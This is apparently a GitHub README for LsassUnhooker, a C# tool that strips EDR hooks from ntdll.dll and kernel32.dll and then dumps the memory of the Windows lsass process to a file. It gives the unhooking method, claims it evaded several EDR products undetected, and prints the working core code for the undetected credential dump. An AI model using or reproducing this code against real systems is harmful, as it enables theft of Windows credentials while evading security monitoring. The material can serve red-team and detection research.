# LsassUnhooker
Little program written in C# to bypass EDR hooks and dump the content of the lsass process. The code makes use of [SharpUnhooker](https://github.com/GetRektBoy724/SharpUnhooker).

This project, created by GetRektBoy724, works the following way:

1.  It reads and copies the `.text section` of the original (in-disk) DLL using "PE parser stuff"
2.  It patches the `.text section` of the loaded DLL using `Marshal.Copy` and `NtProtectVirtualMemory` from D/Invoke (to changes the permission of the memory)
3.  It checks the patched in-memory DLL by reading it again and compare it with the original one to see if its correctly patched.

By just using SharpUnhooker and the MiniDumpWriteDump function, I was able to bypass multiple EDRs and managed to dump the content of lsass without being detected. This is the code that does the trick:

```csharp
SilentUnhooker("ntdll.dll");
SilentUnhooker("kernel32.dll");
String dumpFileName = Directory.GetCurrentDirectory() + "\\" + "lsass.dmp";
if (System.IO.File.Exists(dumpFileName))
{
	System.IO.File.Delete(dumpFileName);
}
IntPtr hFile = NativeMethods.CreateFile(dumpFileName, NativeMethods.EFileAccess.GenericWrite, NativeMethods.EFileShare.None, lpSecurityAttributes: IntPtr.Zero, dwCreationDisposition: NativeMethods.ECreationDisposition.CreateAlways, dwFlagsAndAttributes: NativeMethods.EFileAttributes.Normal, hTemplateFile: IntPtr.Zero);
NativeMethods._MINIDUMP_TYPE dumpType = NativeMethods._MINIDUMP_TYPE.MiniDumpWithFullMemory;
var proc = Process.GetProcessesByName("lsass").FirstOrDefault();
var exceptInfo = new NativeMethods.MINIDUMP_EXCEPTION_INFORMATION();
var result = NativeMethods.MiniDumpWriteDump(proc.Handle, proc.Id, hFile, dumpType, ref exceptInfo, UserStreamParam: IntPtr.Zero, CallbackParam: IntPtr.Zero);
if (result == true) {
	Console.WriteLine("lsass process was successfully dumped in " + Directory.GetCurrentDirectory() + "\\" + "lsass.dmp");
}
else {
	Console.WriteLine("Error dumping lsass process");
}
```

## Example
https://user-images.githubusercontent.com/6664528/123254614-29e3cf80-d4ef-11eb-8c80-882e12cbd1b3.mp4
